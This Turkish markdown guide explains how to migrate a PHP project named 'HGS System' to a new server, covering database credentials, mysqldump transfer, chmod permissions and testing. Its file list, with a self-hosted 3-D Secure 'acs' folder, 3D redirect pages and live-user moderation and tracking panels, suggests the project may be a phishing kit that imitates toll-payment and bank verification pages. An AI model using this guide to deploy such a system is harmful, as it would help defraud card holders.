# 🚀 Sunucu Taşıma Rehberi

## Adım 1: Veritabanı Bilgilerini Güncelle

### Tek Dosyadan Yönetim (ÖNERİLEN)

Sadece `config.php` dosyasını düzenle:

```php
define('DB_HOST', 'yeni_sunucu_adresi');  // Örnek: 'localhost', 'db.example.com'
define('DB_NAME', 'yeni_veritabani_adi'); // Örnek: 'hgs_production'
define('DB_USER', 'yeni_kullanici');      // Örnek: 'db_user'
define('DB_PASS', 'yeni_sifre');          // Örnek: 'güçlü_şifre_123'
```

### Güncellenmiş Dosyalar (config.php kullanıyor)
✅ application-moderate.php
✅ api.php
✅ track_online.php

### Manuel Güncelleme Gereken Dosyalar

Aşağıdaki dosyalarda hala eski yöntem kullanılıyor.
Her birinde şu satırları bul ve değiştir:

```php
$host = 'localhost';
$dbname = 'hgs_system';
$username = 'root';
$password = '';
```

**Ana Dosyalar:**
1. 3dredirect.php
2. success.php
3. process_3d.php

**Admin Panel:**
4. admin.php
5. admin_actions.php
6. admin/pages/dashboard.php
7. admin/pages/users.php
8. admin/pages/online.php

**ACS:**
9. acs/config.php

**Test Dosyaları (Opsiyonel):**
10. test_system.php
11. test_redirect.php
12. test_connection.php

---

## Adım 2: Veritabanını Aktar

### Export (Eski Sunucu)
```bash
mysqldump -u root -p hgs_system > hgs_backup.sql
```

### Import (Yeni Sunucu)
```bash
mysql -u yeni_kullanici -p yeni_veritabani_adi < hgs_backup.sql
```

---

## Adım 3: Dosyaları Yükle

### FTP/SFTP ile
- Tüm dosyaları yeni sunucuya yükle
- Dosya izinlerini kontrol et (755 klasörler, 644 dosyalar)

### Git ile
```bash
git clone your-repo.git
```

---

## Adım 4: Klasör İzinleri

```bash
chmod 755 admin/
chmod 755 acs/
chmod 644 *.php
```

---

## Adım 5: Test Et

1. Ana sayfa: `http://yeni-domain.com/`
2. Admin panel: `http://yeni-domain.com/admin/`
3. Test sayfası: `http://yeni-domain.com/test_system.php`

---

## Hızlı Kontrol Listesi

- [ ] config.php güncellendi
- [ ] Diğer 12 dosya güncellendi
- [ ] Veritabanı export edildi
- [ ] Veritabanı import edildi
- [ ] Dosyalar yüklendi
- [ ] İzinler ayarlandı
- [ ] Ana sayfa test edildi
- [ ] Admin panel test edildi
- [ ] Ödeme akışı test edildi

---

## Sorun Giderme

### "Database connection error"
- config.php bilgilerini kontrol et
- Veritabanı kullanıcısının izinleri var mı?
- Veritabanı adı doğru mu?

### "Session error"
- session.save_path yazılabilir mi?
- PHP session ayarları doğru mu?

### "File not found"
- Tüm dosyalar yüklendi mi?
- Klasör yapısı doğru mu?

---

## Güvenlik Önerileri

1. **Şifreleri Değiştir**: Varsayılan şifreleri kullanma
2. **HTTPS Kullan**: SSL sertifikası ekle
3. **Dosya İzinleri**: 777 izni verme
4. **Admin Şifresi**: admin/login.php'de şifreyi değiştir
5. **Test Dosyalarını Sil**: Canlıda test_*.php dosyalarını sil

---

## Performans İyileştirmeleri

1. **PHP OPcache**: Etkinleştir
2. **MySQL Query Cache**: Etkinleştir
3. **Gzip Compression**: Etkinleştir
4. **CDN**: Statik dosyalar için kullan

---

**Hazırlayan**: HGS System
**Tarih**: 12 Mart 2026
**Versiyon**: 1.0
